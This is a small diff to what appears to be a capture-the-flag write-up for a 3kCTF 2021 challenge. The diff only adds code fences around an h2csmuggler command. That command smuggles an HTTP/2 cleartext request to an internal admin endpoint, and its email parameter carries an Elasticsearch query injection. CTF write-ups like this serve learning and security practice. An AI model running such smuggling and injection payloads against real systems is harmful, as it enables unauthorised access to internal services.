@@ -22,5 +22,6 @@ First Blood
 2- Elastic search injection through email compliant RFC
 
 you can use https://github.com/BishopFox/h2csmuggler
-
+```
 ./h2csmuggler.py -x https://pawnshop.2021.3k.ctf.to:4443/backend/ "http://localhost:8080/admin.py?action=lookup&mail='*\" AND value:*http2_4nd* OR value:\"'@aa.com"
+```
